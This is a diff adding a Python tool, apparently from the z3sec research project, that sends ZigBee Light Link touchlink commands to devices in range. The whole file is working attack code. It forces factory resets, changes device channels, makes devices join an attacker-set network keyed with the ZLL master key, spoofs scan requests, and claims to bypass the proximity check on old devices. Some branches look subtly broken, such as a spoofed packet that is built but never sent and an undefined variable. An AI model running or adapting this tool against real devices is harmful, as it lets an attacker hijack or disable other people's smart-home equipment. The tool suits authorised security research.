@@ -1,0 +1,553 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import argparse
+import os
+import sys
+import time
+
+# suppress annoying Scapy IPv6 warning:
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+from scapy.all import *
+del hexdump
+from scapy.utils import hexdump as hex
+
+from scapy.layers.dot15d4 import *
+from z3sec import radios
+from z3sec import touchlink_crypt
+from z3sec import touchlink_lib
+from z3sec import arg_type
+
+
+### Begin: cmd functions ###
+
+# SCAN cmd:
+def scan_parser(command_parsers):
+    parser_scan = command_parsers.add_parser("scan", help="Send touchlink "
+            "scan requests and displays scan responses. Scanning is repeated "
+            "until at least one device is found.")
+    parser_scan.add_argument("--hexdump", action="store_true",
+            help="Print the hexdump of every received scan response.")
+    parser_scan.add_argument("--show", action="store_true",
+            help="Print details of every received scan response.")
+    parser_scan.set_defaults(func=scan)
+
+def scan(args):
+    try:
+        scan_responses = send_scan_recv(args.radio, args.tl, args.channels)
+        print_responses(scan_responses, hexdump=args.hexdump, show=args.show)
+    except KeyboardInterrupt:
+        clean_exit(args.radio)
+    clean_exit(args.radio)
+
+
+# IDENTIFY cmd:
+def identify_parser(command_parsers):
+    parser_identify = command_parsers.add_parser("identify",
+            help="Send an identify request to a device. On receipt of this "
+            "command, the target device identifies itself by blinking.")
+    parser_identify.add_argument("-d", "--duration", default=0xffff,
+            type=arg_type.duration,
+            help="Set the identify duration in seconds. "
+                "Range: 0x0000-0xffff (or 0-65535). "
+                "Two values have a special effect: "
+                "The value 0 (or 0x0000) stops the identify process "
+                "immidiately, and the value 65535 (or 0xffff) lets the device "
+                "identify itself for a default duration.")
+    parser_identify.add_argument('--no_scan', action="store_true",
+            help="Just boadcast identify request on all specified channels. "
+            "The transaction id is set to zero. This bypasses the proximity "
+            "check of some (old) ZLL devices.")
+    parser_identify.add_argument('--broadcast', action="store_true",
+            help="Send scan requests and broadcast identify requests on all "
+            "specified channels. Do not wait for scan responses.")
+    parser_identify.set_defaults(func=identify)
+
+def identify(args):
+    try:
+        if args.no_scan:
+            identify_request = args.tl.create_identify_request(
+                None, duration=args.duration)
+            identify_request.fcf_destaddrmode = 2  # short
+            identify_request.dest_addr = 0xffff  # broadcast
+            identify_request.inter_pan_transaction_id = 0
+            for c in args.channels:
+                print("Sending broadcast identify request on channel {}".format(c))
+                args.radio.set_channel(c)
+                args.radio.send(str(identify_request))
+        elif args.broadcast:
+            for c in args.channels:
+                print("Sending scan request on channel {}".format(c))
+                args.radio.set_channel(c)
+                scan_request = args.tl.create_scan_request()
+                args.radio.send(str(scan_request))
+                time.sleep(0.25)
+                print("Sending broadcast identify request on channel {}".format(c))
+                identify_request = args.tl.create_identify_request(
+                    None, duration=args.duration)
+                identify_request.fcf_destaddrmode = 2  # short
+                identify_request.dest_addr = 0xffff  # broadcast
+                args.radio.send(str(identify_request))
+        else:
+            scan_responses = send_scan_recv(args.radio, args.tl, args.channels)
+
+            if args.interactive:
+                scan_responses = select_scan_response(scan_responses)
+            else:
+                print_responses(scan_responses)
+            for response in scan_responses:
+                # send identify requests
+                dst_addr = response['pkt'].src_addr
+                print("Sending identify request to: {}"
+                        .format(response['pkt'].sprintf("%Dot15d4Data.src_addr%")))
+                args.radio.set_channel(response['channel'])
+                identify_request = args.tl.create_identify_request(
+                    dst_addr, duration=args.duration)
+                # identify_request.show2()
+                args.radio.send(str(identify_request))
+    except KeyboardInterrupt:
+        clean_exit(args.radio)
+    clean_exit(args.radio)
+
+
+# ANTI-SCAN cmd:
+def anti_scan_parser(command_parsers):
+    parser_anti_scan = command_parsers.add_parser("anti-scan",
+            help="Suppress touchlink scan request of other devices on "
+            "channels other than 11. This is done by spoofing the original "
+            "scan request on the remaining primary channels ahead of time.")
+    parser_anti_scan.set_defaults(func=anti_scan)
+
+def anti_scan(args):
+    try:
+        while True:
+            args.radio.set_channel(11)
+            print("Listening on channel 11 for Scan Requests...")
+            while True:
+                pkt, info = args.radio.recv()
+                if pkt is not None:
+                    if pkt.haslayer(ZLLScanRequest):
+                        print("Received Scan Request from {}".format(
+                            pkt.sprintf("%Dot15d4Data.src_addr%")))
+                        scan_spoof = update_sqn(pkt, inc=5)
+                        send_scan_recv(args.radio, args.tl, [15],
+                                pkt=scan_spoof)
+                        print("\tSpoofed Scan Request on channel 15")
+                        pkt_spoof = update_sqn(pkt, inc=6)
+                        send_scan_recv(args.radio, args.tl, [20],
+                                pkt=scan_spoof)
+                        print("\tSpoofed Scan Request on channel 20")
+                        pkt_spoof = update_sqn(pkt, inc=7)
+                        send_scan_recv(args.radio, args.tl, [25],
+                                pkt=scan_spoof)
+                        print("\tSpoofed Scan Request on channel 25")
+                        break
+    except KeyboardInterrupt:
+        clean_exit(args.radio)
+    clean_exit(args.radio)
+
+
+
+# UPDATE cmd:
+def update_parser(command_parsers):
+    parser_update = command_parsers.add_parser("update",
+        help="Send a network update request to the target device, in order to "
+        "change the channel of a ZLL device. The other arguments, apart from "
+        "'--channel_new', are set to the current values of the target "
+        "device. Modifying these may result in failure.")
+    # These arguments do not have an effect:
+    parser_update.add_argument('--addr_new', type=arg_type.addr_short)
+    parser_update.add_argument('--pan_id_new', type=arg_type.addr_short)
+    parser_update.add_argument('--pan_id_ext_new', type=arg_type.addr_long)
+    parser_update.add_argument('--channel_new', type=arg_type.channel, required=True,
+            help="The new channel on which the target device shall operate "
+            "(11 - 26). The target device looses connection to its current "
+            "network.)")
+    parser_update.set_defaults(func=update)
+
+def update(args):
+    try:
+        scan_responses = send_scan_recv(args.radio, args.tl, args.channels)
+
+        if args.interactive:
+            scan_responses = select_scan_response(scan_responses)
+        else:
+            print_responses(scan_responses)
+        for response in scan_responses:
+            print("Sending network update request to: {}"
+                    .format(response['pkt'].sprintf("%Dot15d4Data.src_addr%")))
+            dst_addr = response['pkt'].src_addr
+            pan_id_ext = args.pan_id_ext_new if \
+                args.pan_id_ext_new else response['pkt'].pan_id_ext
+            network_update_id = response['pkt'].network_update_id + 1
+            channel = args.channel_new if args.channel_new else response['pkt'].channel
+            pan_id = args.pan_id_new if args.pan_id_new else response['pkt'].pan_id
+            network_address = args.addr_new if \
+                args.addr_new else response['pkt'].network_address
+            args.radio.set_channel(response['channel'])
+            update_request = args.tl.create_network_update_request(dst_addr,
+                    network_update_id, channel, pan_id, pan_id_ext,
+                    network_address)
+            # update_request.show2()
+            args.radio.send(str(update_request))
+    except KeyboardInterrupt:
+        clean_exit(args.radio)
+    clean_exit(args.radio)
+
+
+# RESET cmd:
+def reset_parser(command_parsers):
+    parser_reset = command_parsers.add_parser("reset",
+            help="Send a reset requst to a target device. On receipt, the "
+            "target device leaves its current network, and resets all "
+            "settings to factory new.")
+    parser_reset.add_argument('--no_scan', action="store_true",
+            help="Just boadcast identify request on all specified channels. "
+            "The transaction id is set to zero. This bypasses the proximity "
+            "check of some (old) ZLL devices.")
+    parser_reset.add_argument('--broadcast', action="store_true",
+            help="Send scan requests and broadcast reset requests on all "
+            "specified channels. Do not wait for scan responses.")
+    parser_reset.set_defaults(func=reset)
+
+def reset(args):
+    try:
+        if args.no_scan:
+            reset_request = \
+                args.tl.create_reset_to_factory_new_request(None)
+            reset_request.fcf_destaddrmode = 2  # short
+            reset_request.dest_addr = 0xffff  # braodcast
+            reset_request.inter_pan_transaction_id = 0
+            for c in args.channels:
+                print("Sending broadcast reset request on channel {}".format(c))
+                args.radio.set_channel(c)
+                args.radio.send(str(reset_request))
+        elif args.broadcast:
+            for c in args.channels:
+                print("Sending scan request on channel {}".format(c))
+                args.radio.set_channel(c)
+                scan_request = args.tl.create_scan_request()
+                args.radio.send(str(scan_request))
+                time.sleep(0.25)
+                print("Sending broadcast reset request on channel {}".format(c))
+                reset_request = \
+                    args.tl.create_reset_to_factory_new_request(dst_addr)
+                reset_request.fcf_destaddrmode = 2  # short
+                reset_request.dest_addr = 0xffff  # broadcast
+                # reset_request.show2()
+                args.radio.send(str(reset_request))
+        else:
+            scan_responses = send_scan_recv(args.radio, args.tl, args.channels)
+
+            if args.interactive:
+                scan_responses = select_scan_response(scan_responses)
+            else:
+                print_responses(scan_responses)
+            for response in scan_responses:
+                print("Sending reset request to: {}"
+                        .format(response['pkt'].sprintf("%Dot15d4Data.src_addr%")))
+                dst_addr = response['pkt'].src_addr
+                args.radio.set_channel(response['channel'])
+                reset_request = \
+                    args.tl.create_reset_to_factory_new_request(dst_addr)
+                # reset_request.show2()
+                args.radio.send(str(reset_request))
+    except KeyboardInterrupt:
+        clean_exit(args.radio)
+    clean_exit(args.radio)
+
+
+# JOIN cmd:
+def join_parser(command_parsers):
+    parser_join = command_parsers.add_parser("join",
+            help="Send a join network request to a target device and "
+                "integrate it in a new network.")
+    parser_join.add_argument('--addr_new', type=arg_type.addr_short,
+            help="Assign a new short network address to the target device. "
+                "(The target might ignore this option.)")
+    parser_join.add_argument('--channel_new', type=arg_type.channel,
+            help="The new channel on which the target device shall operate "
+            "after joining the network (specified by '--src_pan_id',...). "
+            "Note: Only the primary ZLL "
+            "channels might work (11, 15, 20, 25).")
+    parser_join.add_argument('--network_key', type=arg_type.network_key, required=True,
+            help="Set the network key of the new network (32 hex chars, or 2 "
+            "hex chars which are repeated), this key is encrypted using the "
+            "ZLL master key before transmission.")
+    parser_join.set_defaults(func=join)
+
+def join(args):
+    try:
+        scan_responses = send_scan_recv(args.radio, args.tl, args.channels)
+
+        if args.interactive:
+            scan_responses = select_scan_response(scan_responses)
+        else:
+            print_responses(scan_responses)
+        for response in scan_responses:
+            print("Sending network join request to: {}"
+                    .format(response['pkt'].sprintf("%Dot15d4Data.src_addr%")))
+            dst_addr = response['pkt'].src_addr
+            args.radio.set_channel(response['channel'])
+
+            # encryp network key for key transport:
+            encrypted_network_key = touchlink_crypt.encrypt_network_key(
+                    args.network_key,
+                    response['pkt'].inter_pan_transaction_id,
+                    response['pkt'].response_id,
+                    key=touchlink_crypt.ZLL_MASTER_KEY)
+            encrypted_network_key = int(encrypted_network_key.encode('hex'), 16)
+
+            if args.channel_new is None:
+                args.channel_new = response['channel']
+
+            join_request = \
+                args.tl.create_join_router_request(dst_addr, args.channel_new,
+                        encrypted_network_key, args.addr_new)
+            # join_request.show2()  # DEBUG
+            args.radio.send(str(join_request))
+            start = time.time()
+            # wait for responses
+            while time.time() < start + 5:
+                pkt, info = args.radio.recv()
+                if pkt != None:
+                    if ZLLNetworkJoinRouterRequest in pkt:
+                        pkt.show2()
+    except KeyboardInterrupt:
+        clean_exit(args.radio)
+    clean_exit(args.radio)
+
+### End: cmd functions ###
+
+### Begin: utility functions ###
+
+def send_scan_recv(radio, tl, channels=[11], pkt=None):
+    # TODO: radio interface: validcrc, rssi?
+    responses = list()
+    # scan channels until we found at least one device
+    while len(responses) == 0:
+        time.sleep(1)
+        tl.refresh_inter_pan_transaction_id()
+        for c in channels:
+            print("Scanning channel {}".format(c))
+            radio.set_channel(c)
+            if pkt is None:
+                scan_request = tl.create_scan_request()
+            else:
+                scan_request = pkt
+            radio.send(str(scan_request))
+            start = time.time()
+            while (start + 0.25) > time.time():
+                pkt, info = radio.recv()
+                if pkt != None:
+                    if pkt.haslayer(ZLLScanResponse) and \
+                            scan_request.inter_pan_transaction_id \
+                            == pkt.inter_pan_transaction_id:
+                        # check if duplicate response
+                        duplicate = False
+                        for r in responses:
+                            if r['pkt'].src_addr == pkt.src_addr and \
+                                    r['pkt'].response_id == pkt.response_id:
+                                duplicate = True
+                                break
+                        if duplicate:
+                            continue
+                        # Note: Framework too slow for sending ACKs.
+                        #       -> Impersonate other devices instead!
+                        # send ACK
+                        # ack = Dot15d4FCS()/Dot15d4Ack()
+                        # ack.seqnum = pkt.seqnum
+                        # radio.send(ack)
+                        # append response to list
+                        responses.append({
+                            'pkt': pkt,
+                            'rssi': info['rssi'],
+                            'channel': c,
+                        })
+    return responses
+
+def select_scan_response(scan_responses):
+    # interactively select device
+    print_responses(scan_responses)
+    while True:
+        device_nr_str = raw_input("Please select device for further commands "
+                "by entering its number. You need to decide in less than 8 "
+                "seconds, otherwise the touchlink transaction expires.\n"
+                "Device number: ")
+        if device_nr_str != "":
+            try:
+                device_nr = int(device_nr_str)
+            except ValueError:
+                print("Error: %r is not a number." % device_nr_str)
+                continue
+            if device_nr not in range(0, len(scan_responses)):
+                print("Error: %r out of range." % device_nr)
+                continue
+            return [scan_responses[device_nr]]
+        return scan_responses
+
+def update_sqn(pkt, inc=1):
+    pkt.seqnum = (pkt.seqnum + inc) % 2**8
+    pkt.transaction_sequence = (pkt.transaction_sequence + inc) % 2**8
+    return pkt
+
+def print_responses(pkt_list, hexdump=False, show=False):
+    """Print src_addr and src_pan_id and rssi of every packet in the pkt_list"""
+    print("Received {} scan responses:".format(len(pkt_list)))
+    print("")
+    if hexdump or show:
+        for (i, p) in enumerate(pkt_list):
+            print("# {}:".format(i))
+            if show:
+                p['pkt'].show2()
+            if hexdump:
+                hex(p['pkt'])
+        print("")
+    print("Scan responses overview:")
+    header = ["#", "RSSI", "channel", "src_pan_id", "src_addr"]
+    data = []
+    if len(pkt_list) > 0:
+        for (i, p) in enumerate(pkt_list):
+            data.append([
+                i,
+                p["rssi"],
+                p["channel"],
+                p['pkt'].sprintf("%Dot15d4Data.src_panid%"),
+                p['pkt'].sprintf("%Dot15d4Data.src_addr%")
+            ])
+        print_table(header, data)
+        print("")
+
+def print_table(header, data):
+    # calculate width of columns
+    widths = []
+    for i, h in enumerate(header):
+        max_len = len(str(h))
+        for d in data:
+            if len(str(d[i])) > max_len:
+                max_len = len(str(d[i]))
+        widths.append(max_len)
+
+    # generate format string
+    row_format = ""
+    for w in widths:
+        row_format += "{:<" + str(w+1) + "}|"
+
+    print(row_format.format(*header))
+    print("=" * (sum(widths) + 2*len(header)))  # seperator
+    for d in data:
+        print(row_format.format(*d))
+
+def clean_exit(radio):
+    # close all radios
+    radio.close()
+    sys.exit(0)
+
+### End: utility functions ###
+
+def main():
+    # TODO: implement Start Network Request command?
+
+    parser = argparse.ArgumentParser(description="Send different commands of "
+            "the touchlink commissioning protocol to ZLL devices in range.")
+
+    # radio parser
+    radio_group = parser.add_mutually_exclusive_group(required=True)
+    radio_group.add_argument("--kb", action="append", type=arg_type.kb_dev,
+            help="Use a KillerBee compatible radio device. It is required to "
+                "pass the device string of the radio (e.g. '/dev/ttyUSB0'). "
+                "The device string can be retrieved with the 'zbid' command. "
+                "If this argument is passed twice, one KillerBee radio is used "
+                "only for sniffing and the other is only used for sending "
+                "packets.")
+    radio_group.add_argument("--sdr", action="store_true",
+            help="Use a GNU Radio / USRP radio device.")
+    parser.add_argument("-c", "--channels", default=[11], type=arg_type.channels,
+            help="Set channel for scanning. Default: 11. Valid "
+                "values: 11 - 26. Setting more than one channel is possible "
+                "by seperating the channels by comma (no space). All primary "
+                "channels can be selected by 'primar' or 'p', all secondary "
+                "channels can selected by 'secondary' or 's' and all valid "
+                "channels can be selected by 'all'.")
+
+    parser.add_argument("-i", "--interactive", action="store_true",
+        help="After each scan on all specified channels, all responding "
+        "devices are displayed, and the user is prompted to select one "
+        "device to send further commands to. Note: Select a device within 8 "
+        "seconds, otherwise the transaction expires. If the interactive "
+        "option is not set, further commands are sent do all responding "
+        "devices.")
+
+    # parse touchlink src addresses
+    parser.add_argument("--src_addr", type=arg_type.addr_short,
+            help="Set the short source address of the own radio device "
+            "(e.g. to spoof other devices). If not set, a random address is "
+            "used.")
+    parser.add_argument("--src_addr_ext", type=arg_type.addr_long,
+            help="Set the extended source address of the own radio device "
+            "(e.g. to spoof other devices). If not set, a random address is "
+            "used.")
+    parser.add_argument("--src_pan_id", type=arg_type.addr_short,
+            help="Set the short PAN ID address of the own radio device "
+            "(e.g. to spoof other devices). If not set, a random address is "
+            "used.")
+    parser.add_argument("--src_pan_id_ext", type=arg_type.addr_long,
+            help="Set the extended PAN ID of the own radio device "
+            "(e.g. to spoof other devices). If not set, a random address is "
+            "used.")
+
+    command_parsers = parser.add_subparsers(help="Perform different touchlink "
+            "operations. Enter '--help' after a subcommand in order to "
+            "display further arguments.")
+
+    # add parsers for subcommands
+    scan_parser(command_parsers)
+    anti_scan_parser(command_parsers)
+    reset_parser(command_parsers)
+    update_parser(command_parsers)
+    identify_parser(command_parsers)
+    join_parser(command_parsers)
+
+    # parse args
+    args = parser.parse_args()
+
+    # create touchlink object and store the source arguments inside it
+    args.tl = touchlink_lib.Transaction(src_addr_ext=args.src_addr_ext,
+            src_addr=args.src_addr, src_pan_id_ext=args.src_pan_id_ext,
+            src_pan_id=args.src_pan_id)
+
+    #init radios and store in args.radio:
+    if args.sdr:
+        # args.radio = radios.Wireshark(radios.GnuRadio())  # DEBUG
+        args.radio = radios.GnuRadio()
+    if args.kb is not None:
+        if os.getuid() != 0:
+            print("Insufficient permission: Please run with sudo.")
+            sys.exit(-1)
+        if len(args.kb) == 1:  # single radio
+            print("Setting up Radio:")
+            print("KillerBee Radio (send+recv): {}".format(args.kb[0]))
+            # DEBUG
+            # args.radio = radios.Wireshark(radios.KillerbeeRadio(args.kb[0]))
+            args.radio = radios.KillerbeeRadio(args.kb[0])
+            args.radio.sniffer_on()
+            # kbradio = radios.KillerbeeRadio(args.kb[0])
+            # args.radio = radios.Wireshark(kbradio)
+        if len(args.kb) >= 2:  # dual radio
+            print("Setting up DualRadio:")
+            print("KillerBee Radio (send): {}".format(args.kb[0]))
+            radio_send = radios.KillerbeeRadio(args.kb[0])
+            radio_send.sniffer_off()
+            print("KillerBee Radio (recv): {}".format(args.kb[1]))
+            radio_recv = radios.KillerbeeRadio(args.kb[1])
+            radio_recv.sniffer_on()
+            args.radio = radios.DualRadio(radio_send, radio_recv)
+
+    # execute selected sub-command:
+    args.func(args)
+
+
+if __name__ == "__main__":
+    main()
